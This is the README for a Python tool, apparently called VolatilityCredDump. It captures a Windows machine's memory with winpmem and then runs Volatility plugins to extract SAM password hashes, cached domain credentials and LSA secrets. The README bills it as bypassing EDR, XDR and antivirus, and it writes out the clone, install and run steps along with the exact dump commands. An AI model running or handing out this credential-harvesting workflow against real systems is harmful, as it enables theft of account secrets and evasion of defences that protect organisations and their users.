# Dump memory and get creds using Volatility - Bypassing EDR\XDR\AV

## Features

- Check RAM size and free disk space.
- Create a memory dump if there is sufficient space.
- Perform SAM, Cache, and Lsass dumps using Volatility.
- Option to run all three Volatility commands sequentially.

## Requirements

- Windows operating system.
- Python 3.x installed.
- `psutil` library (install using `pip install psutil`).
- Administrator permissions to run the script.

## Usage

1. **Clone the Repository**:
    ```bash
    git clone https://github.com/sxyrxyy/VolatilityCredDump.git
    cd VolatilityCredDump
    ```

2. **Install Dependencies**:
    ```bash
    pip install psutil
    ```

3. **Run the Script**:
    Open the Command Prompt as Administrator and navigate to the script directory:
    ```bash
    python VolatilityCredDump.py
    ```

## Script Details

### Main Function Workflow

1. **System Checks**:
    - Calculate RAM size in GB.
    - Check free disk space in the current directory.
    - Calculate required space (RAM size + 2GB headroom).

2. **Memory Dump**:
    If confirmed and there is enough space, run `winpmem_mini_x64_rc2.exe` to create `mem.raw`.

3. **Options**:
    If `mem.raw` is created and its size is sufficient, prompt the user with the following options:
    - **1**: SAM dump
    - **2**: Cache dump
    - **3**: Lsass dump
    - **4**: Run all (SAM, Cache, Lsass dumps)
    - **5**: Delete `mem.raw`
    - **6**: Exit the script

### Volatility Commands

- **SAM dump**:
    ```bash
    vol.exe -l sam_dump.txt -f mem.raw windows.hashdump.Hashdump
    ```

- **Cache dump**:
    ```bash
    vol.exe -l cache_dump.txt -f mem.raw windows.cachedump.Cachedump
    ```

- **Lsass dump**:
    ```bash
    vol.exe -l lsass_dump.txt -f mem.raw windows.lsadump.Lsadump
    ```

- **Run All**:
    Sequentially execute SAM dump, Cache dump, and Lsass dump commands.

---

**Note**: Ensure that `winpmem_mini_x64_rc2.exe` and `vol.exe` are in the same directory as the script.

